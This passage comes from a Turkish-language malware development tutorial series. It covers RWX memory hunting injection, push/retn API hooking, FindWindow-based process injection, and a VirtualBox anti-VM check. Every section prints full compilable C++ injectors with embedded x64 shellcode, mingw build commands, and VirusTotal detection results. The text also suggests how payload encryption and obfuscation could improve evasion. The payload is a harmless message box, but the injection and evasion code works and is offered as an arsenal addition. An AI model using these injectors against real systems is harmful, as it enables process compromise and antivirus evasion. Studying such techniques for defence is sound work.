+++++++++++++++++++++++++++++++++++++++++++++
Şimdi zararlı yazılımımızı VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/5fcd9b3c453c7e2ac9dcc48f358b3e7851ac18edf1
3fb1658e29f90ffa2c5a74/detection

Sonuç olarak, 67 antivirüs motorundan 7 tanesi dosyamızı zararlı olarak algıladı.
Bunun nedeni, `VirtualAllocEx` ve `WriteProcessMemory` işlevlerinin birleşiminin çok şüpheli olması ve mavi takım analistleri ile antivirüs motorları tarafından iyi bilinmesidir.

Daha iyi sonuçlar için, payload şifrelemesini bir anahtarla ekleyebilir, işlevleri gizleyebilir veya her iki tekniği birleştirebiliriz.

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

ntddk.h header(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/)
NtQueryInformationProcess(https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)
FindWindow(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa)
ReadProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
SendMessage(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendmessage)
Moneta64.exe(https://github.com/forrest-orr/moneta)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-01-24-malware-injection-15

28. RWX Bellek Avcılığı ile Süreç Enjeksiyonu. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++
Bu, başka bir süreç enjeksiyonu tekniği üzerine yapılan bir araştırmadır. 

RWX Bellek Avcılığı

Hadi, klasik kod enjeksiyonu zararlı yazılımımızın mantığına bakalım:
//...
// allocate memory buffer for remote process
rb = VirtualAllocEx(ph, NULL, my_payload_len,
(MEM_RESERVE | MEM_COMMIT),
PAGE_EXECUTE_READWRITE);

// "copy" data between processes
WriteProcessMemory(ph, rb, my_payload,
sizeof(my_payload), NULL);

// our process start new thread
rt = CreateRemoteThread(ph, NULL, 0,
(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
//...

Hatırlayacağınız gibi, `VirtualAllocEx` işlevini kullanıyoruz. Bu işlev, uzak bir süreç için bellek tamponu ayırmamıza olanak tanır. Ardından, `WriteProcessMemory`, süreçler arasında veri kopyalamamıza izin verir. Ve `CreateRemoteThread`, yeni iş parçacığının hangi süreçte başlatılacağını belirlememize olanak tanır.  

Başka bir yol var mı? Evet, sistemde çalışan hedef süreçleri numaralandırmak, tahsis edilen bellek bloklarını aramak ve herhangi birinin RWX korumasıyla korunduğunu kontrol etmek mümkündür.Bu, bu bloklarda okuma/yazma/çalıştırma işlemlerine girişmeyi sağlayabilir ve bazı AV/EDR çözümlerinden kaçınmaya yardımcı olabilir.

Pratik Örnek

Bu tekniğin akışı basittir, hadi mantığını inceleyelim:  

Sistemdeki tüm süreçler arasında döngü oluşturun:  
+++++++++++++++++++++++++++++

Her bir süreçte tahsis edilen tüm bellek blokları arasında döngü oluşturun: 
+++++++++++++++++++++++++++++

Daha sonra, RWX korumasıyla korunan bir bellek bloğunu kontrol edin: 
+++++++++++++++++++++++++++++

Eğer uygun, bellek bloğunu yazdırın (gösterim için ): 
+++++++++++++++++++++++++++++

Payload'umuzu bu bellek bloğuna yazın:  
+++++++++++++++++++++++++++++

Ardından, yeni bir uzak iş parçacığı başlatın:
+++++++++++++++++++++++++++++

Tam C++ kaynak kodu zararlı yazılımımızın şu şekildedir:
/*
hack.cpp
process injection technique via
RWX memory hunting
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/02/01/malware-injection-16.html
*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {

	MEMORY_BASIC_INFORMATION m;
	PROCESSENTRY32 pe;
	LPVOID address = 0;
	HANDLE ph;
	HANDLE hSnapshot;
	BOOL hResult;
	pe.dwSize = sizeof(PROCESSENTRY32);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return-1;
	hResult = Process32First(hSnapshot, &pe);
	while (hResult) {
		ph = OpenProcess(MAXIMUM_ALLOWED, false, pe.th32ProcessID);
		if (ph) {
			printf("hunting in %s\n", pe.szExeFile);
			while (VirtualQueryEx(ph, address, &m, sizeof(m))) {
				address = (LPVOID)(
				(DWORD_PTR)m.BaseAddress + m.RegionSize);
				if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) {
					printf("rwx memory successfully found at 0x%x :)\n"
					,
					m.BaseAddress);
					WriteProcessMemory(ph, m.BaseAddress,
					my_payload, sizeof(my_payload), NULL);
					CreateRemoteThread(ph, NULL, NULL,
					(LPTHREAD_START_ROUTINE)m.BaseAddress,
					NULL, NULL, NULL);
					break;
				}
			}
			address = 0;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	CloseHandle(hSnapshot);
	CloseHandle(ph);
	return 0;
}
Her zamanki gibi, basitlik adına, payload olarak meow-meow mesaj kutusunu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Demo
Her şeyi eylemde görelim.Bizim pratilk örneğimizi derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive


++++++++++++++++++++++++++++++++++++++++=
Sonra çalıştırın! Bizim durumumuzda, kurban makine Windows 10 x64:
++++++++++++++++++++++++++++++++++++++++=

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı! :)

Hadi kurban süreçlerimizden birini kontrol edelim, örneğin OneDrive: 

++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++=

Bir sorun var. Aşağıda verilen kod, kaba bir kavram kanıtıdır (proof-of-concept) ve bazı süreçlerin çökmesine neden olabilir.Örneğin, benim durumumda `SearchUI.exe` çöktü ve örneğimi çalıştırdıktan sonra artık çalışmıyordu.

Şimdi zararlı yazılımımızı VirusTotal'a yükleyelim:  

++++++++++++++++++++++++++++++++++++++++=
https://www.virustotal.com/gui/file/5835847d11b7f891e70681e2ec3a1e22013fa3ff
e31a36429e7814a3be40bd97/detection

Sonuç olarak, 69 antivirüs motorundan 7 tanesi dosyamızı zararlı olarak algıladı. 
`Moneta64.exe` sonucu:

++++++++++++++++++++++++++++++++++++++++=

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, payload'unuzu kopyalamak için yeni RWX belleği tahsis etmenizi gerektirmemesidir. Bu işlem, `VirtualAllocEx` gibi daha popüler ve şüpheli bir yöntemden kaçınmanızı sağlar. `VirtualAllocEx`, mavi takım üyeleri tarafından daha sık araştırılmaktadır.

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.  

VirtualQueryEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
CreateToolhelp32Snapshot(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
Process32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
Process32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
OpenProcess(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
Taking a snapshot and viewing processes(https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
Hunting memory(https://www.elastic.co/blog/hunting-memory)
Moneta64.exe(https://github.com/forrest-orr/moneta)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-02-01-malware-injection-16



29. Windows API Hooking Bölüm 2. Basit C++ Örneği

﷽
++++++++++++++++++++++++++++++++++++++++=


API Hooking Nedir?

API hooking, API çağrılarının davranışını ve akışını enstrüman etmek ve değiştirmek için kullanılan bir tekniktir. Bu teknik, zararlı kodun algılanıp algılanmadığını belirlemek için birçok antivirüs çözümü tarafından da kullanılır.

Hooking'in en kolay yolu, bir atlama (jump) talimatı eklemektir. Bu bölümde, başka bir tekniği göstereceğim.

Bu yöntem toplamda altı bayttan oluşur ve şu şekilde görünür:  
Push talimatı, bir 32-bit değeri yığına iter ve retn talimatı, yığının tepesindeki 32-bit adresi Instruction Pointer’a (Komut İşaretçisine) çıkarır (başka bir deyişle, yığının en üstünde bulunan adreste yürütmeyi başlatır).

Örnek 1

Bir örneğe bakalım. Bu durumda, kernel32.dll içindeki WinExec işlevini hooklayabilirim (`hooking.cpp`):
/*
hooking.cpp
basic hooking example with push/retn method
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/03/08/basic-hooking-2.html
*/
#include <windows.h>

// buffer for saving original bytes
char originalBytes[6];
FARPROC hookedAddress;

// we will jump to after the hook has been installed
int __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {
	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, originalBytes, 6, NULL);
	return WinExec("mspaint", uCmdShow);
}

// hooking logic
void setMySuperHook() {
	HINSTANCE hLib;
	VOID *myFuncAddress;
	DWORD *rOffset;
	DWORD *hookAddress;
	DWORD src;
	DWORD dst;
	CHAR patch[6]= {0};

	// get memory address of function WinExec
	hLib = LoadLibraryA("kernel32.dll");
	hookedAddress = GetProcAddress(hLib, "WinExec");

	// save the first 6 bytes into originalBytes (buffer)
	ReadProcessMemory(GetCurrentProcess(),
	(LPCVOID) hookedAddress,
	originalBytes, 6, NULL);

	// overwrite the first 6 bytes with a jump to myFunc
	myFuncAddress = &myFunc;
	// create a patch "push <addr>, retn"
	memcpy_s(patch, 1,
	"\x68"
	, 1); // 0x68 opcode for push
	memcpy_s(patch + 1, 4, &myFuncAddress, 4);
	memcpy_s(patch + 5, 1,
	"\xC3"
	, 1); // opcode for retn
	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, patch, 6, NULL);
}
int main() {
	// call original
	WinExec("notepad", SW_SHOWDEFAULT);
	// install hook
	setMySuperHook();
	// call after install hook
	WinExec("notepad", SW_SHOWDEFAULT);
}

Gördüğünüz gibi, kaynak kod ilk bölümdeki hooking örneğiyle aynıdır. Tek fark şudur:
++++++++++++++++++++++++++++++++++++++++=

Bu, aşağıdaki assembly talimatlarına çevrilecektir:
// push myFunc memory address onto the stack
push myFunc

// jump to myFunc
Return
Haydi,şunu bir derleyelim:
i686-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive >/dev/null 2>&1

++++++++++++++++++++++++++++++++++++++++=

Ve Windows 7 x64’te çalıştıralım:
.\hooking.exe

++++++++++++++++++++++++++++++++++++++++=

Gördüğünüz gibi her şey mükemmel çalışıyor :)

x86 API Hooking Demystified(http://jbremer.org/x86-api-hooking-demystified/)
WinExec(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-03-08-basic-hooking-2

30. FindWindow ile Süreç Enjeksiyonu. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++

Bu yazı, Win32 API işlevlerinden biri üzerine yaptığım araştırmaların bir sonucudur.

Önceki yazılarımdan birinde, enjeksiyon aracım için bir süreci isimle nasıl bulacağımı yazmıştım. 

Süreç veya DLL enjeksiyonu yazarken, sistemde çalışan tüm pencereleri bulmak ve örneğin yönetici tarafından başlatılan bir sürece enjekte etmeye çalışmak güzel olabilir.
  
En basit durumda, kurbanımız olacak bir sürecin herhangi bir penceresini bulabiliriz.

Pratik Örnek

Bu tekniğin akışı basittir. Kaynak kodu inceleyelim:

/*
* hack.cpp - classic process injection
* via FindWindow. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/03/08/malware-injection-17.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HANDLE ph;
	HANDLE rt;
	DWORD pid;

	// find a window for mspaint.exe
	HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
	if (hw == NULL) {
		printf("failed to find window :(\n");
		return-2;
	}
	GetWindowThreadProcessId(hw, &pid);
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID rb = VirtualAllocEx(ph, NULL,
	sizeof(my_payload),
	MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, rb, my_payload,
	sizeof(my_payload), NULL);
	rt = CreateRemoteThread(ph, NULL, 0,
	(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
	CloseHandle(ph);
	return 0;
}

Her zamanki gibi, basitlik adına, payload olarak meow-meow mesaj kutusunu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Gördüğünüz gibi,ana mantık burda:

//...
// find a window for mspaint.exe
HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
if (hw == NULL) {
	printf("failed to find window :(\n");
	return-2;
}
GetWindowThreadProcessId(hw, &pid);
ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//...

DEMO

Haydi derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++

Ve çalıştıralım:

.\hack.exe 1304

+++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++

Gördüğünüz gibi,her şey mükemmel çalışıyor:

Anti-VM
Bu işlevin başka bir kullanım örneği, sanal makine (VM) 'kaçınması'dır. Bazı pencere adlarının yalnızca sanal bir ortamda mevcut olması ve normal ana bilgisayar işletim sisteminde olmaması gerçeği buna dayanır.
Bir örneğe bakalım:
/*
* hack.cpp - VM evasion via FindWindow. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/03/08/malware-injection-17.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {
	HANDLE ph;
	HANDLE rt;
	DWORD pid;

	// find a window with certain class name
	HWND hcl = FindWindow((LPCSTR) L"VBoxTrayToolWndClass", NULL);
	HWND hw = FindWindow(NULL, (LPCSTR) L"VBoxTrayToolWnd");
	if (hcl || hw) {
		pid = atoi(argv[1]);
		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(ph, rb, my_payload,
		sizeof(my_payload), NULL);
		rt = CreateRemoteThread(ph, NULL, 0,
		(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
		CloseHandle(ph);
		return 0;
	} else {
		printf("virtualbox VM detected :(");
	return-2;
	}
}

Gördüğünüz gibi, yalnızca aşağıdaki sınıf adlarına sahip pencerelerin işletim sisteminde mevcut olup olmadığını kontrol ediyoruz:
VBoxTrayToolWndClass
VBoxTrayToolWnd
Hadi derleyelim:
x86_64-w64-mingw32-g++ hack2.cpp -o hack2.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++


Ve çalıştıralım:

.\hack2.exe 1304

+++++++++++++++++++++++++++++++++

Her şey VirtualBox Windows 10 x64 için mükemmel bir şekilde çalışıyor.
Şimdi hack2.exe dosyamızı VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++

Sonuç olarak, 66 antivirüs motorundan 4 tanesi dosyamızı zararlı olarak algıladı.
https://www.virustotal.com/gui/file/dd340e3de34a8bd76c8693832f9a665b47e98fce
58bf8d2413f2173182375787/detection 
Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
FindWindow(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa)
Evasions UI artifacts(https://evasions.checkpoint.com/techniques/ui-artifacts.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-03-14-malware-injection-17


31. Zararlı Yazılım Geliştirme Tüyoları. Kernel32.dll Tabanını Bulma: ASM Tarzı. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++
Bu bölüm, gerçek hayattaki zararlı yazılımlarda kullanılan ilginç bir numara üzerine yaptığım kendi araştırmaların bir sonucudur.
Yazılarımdan birinde, GetModuleHandle kullanımından bahsetmiştim. Bu işlev, belirtilen bir DLL'in bir tanıtıcısını döndürür. Örneğin:
#include <windows.h>
LPVOID (WINAPI * pVirtualAlloc)(
LPVOID lpAddress, SIZE_T dwSize,
DWORD flAllocationType, DWORD flProtect);

//...

int main() {
	DWORD oldprotect = 0;
	HMODULE hk32 = GetModuleHandle("kernel32.dll");
	pVirtualAlloc = GetProcAddress(hk32, "VirtualAlloc");
//...

return 0;
}
